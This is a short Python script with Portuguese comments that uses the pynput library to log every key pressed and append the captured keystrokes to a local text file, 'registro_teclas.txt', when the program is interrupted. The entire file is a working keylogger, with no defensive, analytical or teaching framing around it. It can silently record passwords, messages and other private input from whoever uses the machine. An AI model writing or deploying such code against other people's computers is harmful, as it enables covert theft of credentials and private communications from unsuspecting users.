from pynput import keyboard

# Variável para armazenar a tecla atual
tecla_atual = ""

# Função chamada quando uma tecla é pressionada
def on_press(key):
    global tecla_atual

    try:
        # Adiciona a tecla pressionada à tecla atual
        tecla_atual += str(key.char)
    except AttributeError:
        # Se a tecla não for um caractere, grava a representação da tecla
        tecla_atual += str(key)

# Função para salvar a tecla atual em um arquivo .txt
def salvar_tecla():
    global tecla_atual
    with open("registro_teclas.txt", "a") as f:
        f.write(tecla_atual + "\n")
    tecla_atual = ""  # Limpa a tecla atual após salvar

# Cria um objeto Listener para monitorar as teclas
with keyboard.Listener(on_press=on_press) as listener:
    try:
        # Mantém o programa em execução
        listener.join()
    except KeyboardInterrupt:
        # Encerra o programa quando o usuário pressiona Ctrl+C e salva a tecla atual
        salvar_tecla()